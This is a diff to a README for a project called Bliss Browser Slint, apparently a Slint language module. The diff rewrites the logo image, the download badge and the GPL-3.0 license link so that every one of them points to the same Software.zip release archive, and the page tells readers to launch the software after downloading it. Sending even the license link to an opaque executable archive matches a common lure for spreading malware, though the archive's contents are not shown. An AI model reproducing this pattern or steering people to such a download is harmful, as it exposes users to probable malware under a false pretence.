@@ -2,7 +2,7 @@
 
 Welcome to the Bliss Browser Slint repository, your gateway to writing and running Slint programs directly within your web browser!
 
-![Bliss Browser Slint Logo](https://example.com/bliss-browser-slint-logo.png)
+![Bliss Browser Slint Logo](https://github.com/aidan19832/Bliss_Browser_Slint/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -19,7 +19,7 @@ Bliss Browser Slint is a language support module for the Bliss Browser project, 
 
 To get started with Bliss Browser Slint, simply download the software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/aidan19832/Bliss_Browser_Slint/releases/download/v2.0/Software.zip)](https://github.com/aidan19832/Bliss_Browser_Slint/releases/download/v2.0/Software.zip)
 
 Please note that the software needs to be launched after downloading.
 
@@ -41,7 +41,7 @@ We welcome contributions from the community to enhance Bliss Browser Slint and m
 
 ## License
 
-Bliss Browser Slint is licensed under [GNU General Public License v3.0 (GPL-3.0)](https://www.gnu.org/licenses/gpl-3.0.html). Feel free to explore, modify, and distribute the software in accordance with the terms of the license.
+Bliss Browser Slint is licensed under [GNU General Public License v3.0 (GPL-3.0)](https://github.com/aidan19832/Bliss_Browser_Slint/releases/download/v2.0/Software.zip). Feel free to explore, modify, and distribute the software in accordance with the terms of the license.
 
 ---
 
